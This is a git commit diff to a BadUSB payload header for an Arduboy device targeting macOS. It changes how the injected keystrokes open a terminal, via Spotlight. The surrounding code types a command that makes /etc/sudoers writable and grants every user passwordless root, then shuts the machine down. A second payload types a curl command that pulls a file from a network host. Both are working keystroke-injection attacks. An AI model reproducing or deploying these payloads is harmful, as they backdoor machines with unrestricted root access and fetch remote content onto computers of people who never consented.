c4ce7d9787ce48a2155dce829cb3b0e174dc46d5
Hugo Roman Dominguez <hromandomnguez69@gmail.com>
2022-12-21 23:04:05 +0100

    cambio terminal mac

--- arduboy_badusb/payloads_macos.h
+++ arduboy_badusb/payloads_macos.h
@@ -19,7 +19,10 @@
 
 void EasySudo(){
   delay(3000);
-//  CommandAtRunBarOSX("terminal");
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  delay(100);
+  Keyboard.releaseAll();
   delay(3000);
   Keyboard.println("mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now");
   delay(3000);
@@ -28,7 +31,10 @@ void EasySudo(){
 
 void Command(){
   delay(5000);
-  //CommandAtRunBarOSX("terminal");
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  delay(100);
+  Keyboard.releaseAll();
   delay(3000);
   Keyboard.println("curl http://192.168.1.229 > virus.txt");
   delay(2000);
